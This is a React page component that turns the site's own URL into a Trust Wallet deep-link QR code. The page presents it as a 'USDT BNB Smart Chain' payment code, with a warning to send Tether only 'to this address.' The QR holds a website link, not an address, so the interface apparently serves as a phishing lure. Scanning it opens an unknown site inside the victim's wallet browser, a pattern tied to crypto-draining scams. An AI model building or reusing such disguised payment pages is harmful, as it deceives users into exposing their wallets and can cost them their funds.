import { useState, useEffect } from "react";
import QRCode from "qrcode";
import { Button } from "@/components/ui/button.tsx";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card.tsx";
import { Download, Copy, Check } from "lucide-react";
import { toast } from "sonner";

export default function QRCodePage() {
  const [qrDataUrl, setQrDataUrl] = useState("");
  const [copied, setCopied] = useState(false);
  const websiteUrl = window.location.origin;
  const deepLink = `https://link.trustwallet.com/browser?url=${encodeURIComponent(websiteUrl)}`;

  useEffect(() => {
    async function generateQRCode() {
      try {
        const dataUrl = await QRCode.toDataURL(deepLink, {
          width: 400,
          margin: 3,
          color: {
            dark: "#000000",
            light: "#FFFFFF",
          },
        });
        
        setQrDataUrl(dataUrl);
      } catch (error) {
        console.error("QR code generation failed:", error);
        toast.error("Failed to generate QR code");
      }
    }
    
    generateQRCode();
  }, [deepLink]);

  function downloadQR() {
    if (!qrDataUrl) return;
    
    const link = document.createElement("a");
    link.href = qrDataUrl;
    link.download = "trust-wallet-qr-code.png";
    link.click();
    toast.success("QR code downloaded");
  }

  function copyDeepLink() {
    navigator.clipboard.writeText(deepLink);
    setCopied(true);
    toast.success("Deep link copied");
    setTimeout(() => setCopied(false), 2000);
  }

  return (
    <div className="min-h-screen bg-[#0b0b0b] text-white flex items-center justify-center p-4">
      <Card className="max-w-lg w-full bg-[#151515] border-[#252525]">
        <CardHeader>
          <CardTitle className="text-center text-2xl text-white">
            Trust Wallet QR Code
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-6">
          {/* QR Code Display */}
          <div className="bg-white rounded-xl p-6 flex flex-col items-center">
            <div className="flex items-center gap-2 mb-4">
              <span className="text-sm font-semibold text-[#25d695] bg-[#0b0b0b] px-3 py-1 rounded-full">
                USDT BNB Smart Chain
              </span>
            </div>
            
            {qrDataUrl && (
              <img 
                src={qrDataUrl} 
                alt="Trust Wallet QR Code" 
                className="w-full max-w-sm"
              />
            )}

            <div className="mt-4 text-xs text-gray-600 break-all font-mono text-center px-2">
              {websiteUrl}
            </div>
          </div>

          {/* Deep Link */}
          <div className="space-y-2">
            <div className="text-sm text-gray-400">Deep Link:</div>
            <div className="bg-[#0b0b0b] rounded-lg p-3 flex items-center justify-between gap-2">
              <div className="text-xs text-gray-400 break-all flex-1 font-mono">
                {deepLink}
              </div>
              <Button
                size="sm"
                variant="ghost"
                onClick={copyDeepLink}
                className="text-[#25d695] hover:text-[#1f8f5f] shrink-0"
              >
                {copied ? <Check size={16} /> : <Copy size={16} />}
              </Button>
            </div>
          </div>

          {/* Download Button */}
          <Button
            onClick={downloadQR}
            className="w-full bg-[#25d695] hover:bg-[#1f8f5f] text-black font-semibold"
            size="lg"
          >
            <Download className="mr-2 h-5 w-5" />
            Download QR Code
          </Button>

          {/* Instructions */}
          <div className="bg-[#0b0b0b] rounded-lg p-4 space-y-2">
            <div className="text-sm font-semibold text-[#25d695]">How to use:</div>
            <ol className="text-xs text-gray-400 space-y-1 list-decimal list-inside">
              <li>Download the QR code image</li>
              <li>Open Trust Wallet on your device</li>
              <li>Tap the scan icon</li>
              <li>Scan this QR code</li>
              <li>Website will open automatically in Trust Wallet browser</li>
            </ol>
          </div>

          {/* Warning */}
          <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3">
            <div className="text-xs text-yellow-500">
              ⚠️ Only send Tether USD (BEP20) assets to this address. Other assets will be lost forever.
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
